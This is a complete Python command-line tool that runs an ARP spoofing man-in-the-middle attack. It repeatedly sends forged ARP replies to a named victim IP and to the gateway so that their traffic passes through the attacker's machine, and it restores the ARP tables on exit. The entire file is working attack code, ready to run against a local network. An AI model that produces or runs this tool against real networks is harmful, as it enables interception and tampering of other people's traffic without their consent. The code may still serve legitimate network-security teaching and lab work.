#!/usr/bin/env python3

import argparse
import time
import sys

import kamene.all as scapy


BROADCAST_ADDRESS = "ff:ff:ff:ff:ff:ff"


def get_arguments():
    """
    Return the arguments:
    - target_ip: Victim IP address to spoof
    - gateway_ip: Gateway IP address
    - delay: How often to send the spoof packets
    """

    # Create parser
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target-ip", dest="target_ip", help="Victim IP Address")
    parser.add_argument("-g", "--gateway-ip", dest="gateway_ip", help="Gateway IP Address")
    parser.add_argument("-d", "--delay", dest="delay", help="Frequency of spoof packets", type=int, default=2)

    # Parse arguments
    arguments = parser.parse_args()
    if not arguments.target_ip:
        parser.error("[-] Please specify the IP address of the victim to spoof. Use --help for more info.")
    elif not arguments.gateway_ip:
        parser.error("[-] Please specify the IP address of the gateway. Use --help for more info.")
    return arguments


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst=BROADCAST_ADDRESS)
    arp_broadcast_request = broadcast/arp_request

    answered, unanswered = scapy.srp(arp_broadcast_request, timeout=1, verbose=False)
    if not answered:
        print(f"[-] Could not locate {ip} on the network.")
        sys.exit("[-] Exiting.")
    else:
        sent, answer = answered[0]
        return answer.hwsrc


def spoof(target_ip, spoof_ip):
    """
    Spoof an ARP response back to the target machine
    impersonating as the spoofed IP Address.

    :param target_ip: Target Machine IP
    :param spoof_ip: IP to spoof as
    :return:
    """

    target_mac_address = get_mac_address(target_ip)
    scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=spoof_ip), verbose=False)


def restore(destination_ip, source_ip):
    """
    Send an ARP response to the destination IP correcting the MAC address for the source IP.
    """

    destination_mac_address = get_mac_address(destination_ip)
    source_mac_address = get_mac_address(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac_address,
                       psrc=source_ip, hwsrc=source_mac_address)
    scapy.send(packet, count=4, verbose=False)
    print(f"[+] Reset {source_ip}'s Mac Address in {destination_ip}'s ARP table.")


def main(target_ip, gateway_ip, delay):
    """
    Send spoofed ARP responses to the victim and gateway every few seconds

    :param target_ip: str
    :param gateway_ip: str
    :param delay: int
    """

    sent_packets_counter = 0
    try:
        print(f"[+] Beginning spoof of {target_ip}'s MAC address to {gateway_ip}.")
        print(f"[+] Beginning spoof of {gateway_ip}'s MAC address to {target_ip}.")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_counter += 2
            print(f"\r[+] Spoofed packets sent: {sent_packets_counter}", end="")
            time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ...... Resetting ARP tables..... Please wait..")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)


if __name__ == "__main__":
    args = get_arguments()
    main(args.target_ip, args.gateway_ip, args.delay)

